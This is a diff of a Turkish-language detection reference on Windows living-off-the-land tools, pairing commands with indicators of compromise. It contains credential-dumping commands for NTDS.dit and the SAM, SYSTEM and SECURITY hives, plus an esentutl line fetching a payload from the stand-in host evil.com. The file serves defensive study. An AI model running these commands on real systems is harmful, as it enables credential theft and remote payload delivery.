@@ -16,6 +16,8 @@ VSS yönetimi. Script ile NTDS.dit kopyalama
 
 **Komut:**
   diskshadow /s payload.dsh
+
+**Komut:**
   dsh içi: create shadow, expose, copy ntds.dit
 
 **IOC:** Script dosyası argümanı, Temp'te .dsh dosyası
@@ -29,6 +31,8 @@ ESE veritabanı yönetimi. Dosya kopyalama, NTDS.dit çekme.
 
 **Komut:**
   esentutl.exe /y C:\windows\ntds\ntds.dit /d C:\temp\ntds.dit /o
+  
+**Komut:**
   esentutl.exe /y \\evil.com\share\payload.exe /d C:\temp\p.exe /o
 
 **IOC:** /y parametresi = kopyalama, kaynak NTDS.dit veya SAM ise kritik
@@ -41,7 +45,11 @@ Registry yönetimi. SAM ve SYSTEM hive'larını dışarı aktarma, credential du
 
 **Komut:**
   reg save HKLM\SAM C:\temp\sam.hiv
+
+**Komut:**
   reg save HKLM\SYSTEM C:\temp\system.hiv
+  
+**Komut:**
   reg save HKLM\SECURITY C:\temp\security.hiv
 
 **IOC:** reg save + SAM/SYSTEM/SECURITY üçlüsü = credential dump girişimi
